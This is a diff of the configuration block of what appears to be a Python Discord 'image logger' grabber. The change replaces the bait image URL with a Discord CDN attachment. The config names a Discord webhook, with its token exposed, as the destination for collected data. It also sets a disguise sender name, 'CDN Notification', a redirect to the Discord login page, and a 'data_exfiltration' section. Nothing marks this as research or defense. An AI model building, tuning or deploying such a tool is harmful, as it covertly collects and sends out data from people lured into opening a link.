@@ -6,7 +6,7 @@ import traceback, requests, base64, httpagentparser, json
 # --- CONFIGURATION ---
 config = {
     "webhook_url": "https://discord.com/api/webhooks/1486421624290021577/vMAwwjPITk9b9WisuCgm5RowYpn8iTpTgaHDRque7Q_J8QnSHh4ABlHlmWbSkepdWd-r",
-    "image_url": "https://i.imgur.com/vXqP4hL.png",
+    "image_url": "https://cdn.discordapp.com/attachments/1473071601569366222/1485762309120069732/d24c8368ba4723097d2f0271b21cca22.jpg?ex=69c505ba&is=69c3b43a&hm=4f4e67e12dc9886b6036d72a7b3ad34a9c2bebefceef2821368988e59fac272c",
     "username": "CDN Notification", "color": 0x5865F2,
     "redirect": {"enabled": True, "url": "https://discord.com/login"},
     "data_exfiltration": {
